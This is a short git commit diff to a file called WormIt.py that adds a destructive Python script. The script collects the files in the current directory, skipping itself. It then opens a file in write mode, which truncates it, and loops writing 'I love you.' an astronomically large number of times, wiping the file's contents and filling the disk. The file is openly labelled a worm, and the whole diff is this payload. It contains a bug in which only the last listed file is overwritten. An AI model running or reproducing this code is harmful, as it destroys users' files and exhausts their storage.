e4132d2a765aa27f246ab0426b1a81e4ca6fcf3a
PyTerminal <124309800+PyTerminal@users.noreply.github.com>
2023-03-20 19:32:45 -0400

    Update WormIt.py

--- WormIt.py
+++ WormIt.py
@@ -1,2 +1,13 @@
 import os
 files = []
+for file in os.listdir():
+  if os.path.isfile(file):
+    if file == "wormit.py":
+      continue
+    else:
+      files.append(file)
+  else:
+    continue
+with open(file, "w") as wf:
+  for write in range(10000000000000000000000000000000000):
+    wf.write("I love you.")
